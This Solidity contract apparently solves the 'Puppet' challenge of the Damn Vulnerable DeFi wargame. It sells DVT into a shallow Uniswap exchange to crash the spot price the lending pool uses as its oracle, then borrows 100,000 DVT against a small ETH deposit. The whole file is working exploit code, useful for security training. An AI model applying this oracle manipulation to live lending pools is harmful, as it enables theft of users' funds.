//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {PuppetPool} from "./PuppetPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import "./IUniswapExchange.sol";
import "hardhat/console.sol";

contract AttackPuppet {
    uint256 SELL_DVT_AMOUNT = 1000 ether; // actually DVT
    uint256 BORROW_DVT_AMOUNT = 100000 ether; // same here
    PuppetPool public pool;
    DamnValuableToken public token;
    IUniswapExchange public exchange;
    address public player;
    uint256 public count;

    uint256 constant DEPOSIT_FACTOR = 2;

    event Error(bytes err);

    constructor(
        address _exchange,
        address _pool,
        address _token,
        address _player
    ) payable {
        exchange = IUniswapExchange(_exchange);
        pool = PuppetPool(_pool);
        token = DamnValuableToken(_token);
        player = _player;
    }

    function swap() public {

        // Calculate required collateral
        uint256 price = address(exchange).balance * (10 ** 18) / token.balanceOf(address(exchange));
        uint256 depositRequired = BORROW_DVT_AMOUNT * price * DEPOSIT_FACTOR / 10 ** 18;

        console.log("1. attacker ETH balance: ", address(this).balance / 10 ** 18);
        console.log("1. DVT price: ", price / 10 ** 18);
        console.log("1. Deposit Required: ", depositRequired / 10 ** 18);
        console.log("1. pool DVT balance: ", token.balanceOf(address(pool)) / 10 ** 18);


        token.approve(address(exchange), SELL_DVT_AMOUNT);
        // dump DVT in pools and get back some eth. this will minimize the collateral
        exchange.tokenToEthSwapInput(SELL_DVT_AMOUNT, 1, block.timestamp + 5000); // we sell 1000

        price = address(exchange).balance * (10 ** 18) / token.balanceOf(address(exchange));
        depositRequired = BORROW_DVT_AMOUNT * price * DEPOSIT_FACTOR / 10 ** 18;

        console.log("2. attacker ETH balance: ", address(this).balance / 10 ** 18);
        // we do not do the division, because it would display 0, the DVT price would be 0.000098321649443991
        console.log("2. DVT price, should be divided by 10^18 ", price);
        console.log("2. Deposit Required: ", depositRequired / 10 ** 18);

        pool.borrow{value: 20 ether, gas: 1000000}(BORROW_DVT_AMOUNT, player);

        console.log("3. attacker ETH balance: ", address(this).balance / 10 ** 18);
        console.log("3. player ETH balance: ", player.balance / 10 ** 18);
        console.log("3. player DVT balance: ", token.balanceOf(player) / 10 ** 18);
        console.log("3. pool DVT balance: ", token.balanceOf(address(pool)) / 10 ** 18);
    }

    receive() external payable {}
}
